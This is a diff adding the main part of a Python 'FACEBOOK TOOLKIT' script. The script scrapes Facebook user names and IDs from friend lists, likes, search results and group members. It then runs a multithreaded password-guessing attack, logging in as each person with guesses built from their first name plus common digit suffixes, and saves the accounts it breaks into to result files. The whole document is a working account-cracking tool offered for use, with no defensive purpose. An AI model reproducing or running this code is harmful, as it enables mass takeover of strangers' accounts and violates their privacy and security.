@@ -117,4 +117,147 @@ def fromlikes(url):
                 exit("# cant dump id ")
 def getlike(react):
         like = requests.get(react,cookies=kuki).content
-        ids  = re.findall('class="b."><a href="(.*?)">(.*
+        ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
+        for user in ids:
+                if 'profile' in user[0]:
+                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
+                else:
+                        id.append(user[1] + "|" + user[0].split('/')[1])
+                print(f'\r# {str(len(id))} retrieved',end="")
+        if 'Lihat Selengkapnya' in str(like):
+                getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
+        return id
+def bysearch(option):
+        search = requests.get(option,cookies=kuki).content
+        users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
+        for user in users:
+                if "profile" in user[0]:
+                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
+                else:
+                        id.append(user[1] + "|" + user[0].split("?")[0])
+                print(f"\r# {str(len(id))} retrieved ",end="")
+        if "Lihat Hasil Selanjutnya" in str(search):
+                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
+        return id
+def grubid(endpoint):
+        grab = requests.get(endpoint,cookies=kuki).content
+        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
+        for user in users:
+                if "profile" in user[0]:
+                        id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
+                else:
+                        id.append(user[1] + "|" + user[0])
+                print(f"\r# {str(len(id))} retrieved ",end="")
+        if "Lihat Selengkapnya" in str(grab):
+                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
+        return id
+if __name__ == '__main__':
+        try:
+                os.system("git pull")
+                ses = requests.Session()
+                kukis = masuk()
+                kuki = {'cookie':kukis}
+                os.system("clear")
+                print('\n\n\t\t≺ \033[1;36mFACEBOOK TOOLKIT\033[0m ≻\n\n')
+                print('\033[1;91m👉 \033[0m[\033[1;32m1\033[0m] List friends')
+                print('\033[1;91m👉 \033[0m [\033[1;32m2\033[0m] Crack From Likes\033[1;91m ')
+                print('👉 \033[0m[\033[1;32m3\033[0m] Crack From Search Name')
+                print('\033[1;91m👉 \033[0m[\033[1;32m4\033[0m] Crack From group ')
+                print('\033[1;91m👉 \033[0m[\033[1;32m5\033[0m] Crack From friend')
+                print('\033[1;91m👉 \033[0m[\033[1;32m6\033[0m] Results check')
+                print('\033[1;91m┗\033[0m\n')
+                print()
+                tanya = input('➛ ')
+                if tanya =="":
+                        exit("[!] Dont be empty")
+                elif tanya == '1':
+                        url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
+                        username = getid(mbasic.format(url["href"]))
+                elif tanya == '2':
+                        username = input("# url : ")
+                        if username == "":
+                                exit("# Dont be empty")
+                        elif 'www.facebook' in username:
+                               username = username.replace('www.facebook','mbasic.facebook')
+                        elif 'm.facebook.com' in username:
+                               username = username.replace('m.facebook.com','mbasic.facebook.com')
+                        username = fromlikes(username) 
+                elif tanya == '3':
+                        zet = input("# query : ")
+                        username = bysearch(mbasic.format('/search/people/?q='+zet))
+                        if len(username) == 0:
+                                exit("# no result")
+                elif tanya == '4':
+                        print("# can only take 100 IDs ")
+                        grab = input("# ID group : ")
+                        username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
+                        if len(username) == 0:
+                                exit("# ID wrong")
+                elif tanya == '5':
+                        zet = input("# enter username/Id : ")
+                        if zet.isdigit():
+                                user = "/profile.php?id=" + zet
+                        else:
+                                user = "/" + zet
+                        try:
+                                user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
+                                username = getid(mbasic.format(user))
+                        except TypeError:
+                                exit("# user not found ")
+                elif tanya == '6':
+                        try:
+                                file1 = open("results-check.txt").read()
+                                file2 = open("results-life.txt").read()
+                                a = file1 + file2
+                                final = a.strip().split("\n")
+                                final = set(final)
+                                print(f"# {str(len(final))} accounts to check ")
+                                with ThreadPoolExecutor(max_workers=10) as ex:
+                                        for user in final:
+                                                a = user.split("|")
+                                                ex.submit(login,(a[0]),(a[1]),(True))
+                                os.remove("results-check.txt")
+                                os.remove("results-life.txt")
+                                for x in life:
+                                        with open('results-life.txt','a') as f:
+                                                f.write(x+'\n')
+                                for x in chek:
+                                        with open('results-check.txt','a') as f:
+                                                f.write(x+"\n")
+                                
+                                print("\n# Done")
+                                print("# saved to results-check.txt results-life.txt")
+                                exit()
+                        except FileNotFoundError:
+                                exit("# you not have a results")
+                else:
+                        exit("# wrong choice")
+                print()
+                expass = input("[\033[1;32m>\033[0m] Extra Password : ")
+                print("# result will be saved in results-life.txt and results-check.txt")
+                with ThreadPoolExecutor(max_workers=30) as ex:
+                        for user in username:
+                                users = user.split('|')
+                                ss = users[0].split(' ')
+                                for x in ss:
+                                        listpass = [
+                                                str(x) + '123',
+                                                str(x) + '12345',
+                                                str(x) + '123456',
+                                                str(x) + '12',
+                                                ]
+                                        listpass.append(expass)
+                                        for passw in set(listpass):
+                                                ex.submit(login,(users[1]),(passw))
+                if check != 0 or result != 0:
+                        print("\n[\033[1;32m✔\033[0m Done. file saved in : ")
+                        print("        - life : results-life.txt")
+                        print("        - checkpoint : results-check.txt")
+                        exit("# thanks for using this tools")
+                else:
+                        print("\n# Done")
+                        exit("# no result")
+        except (KeyboardInterrupt,EOFError):
+                exit()
+        except requests.exceptions.ConnectionError:
+                exit("# Connection error")
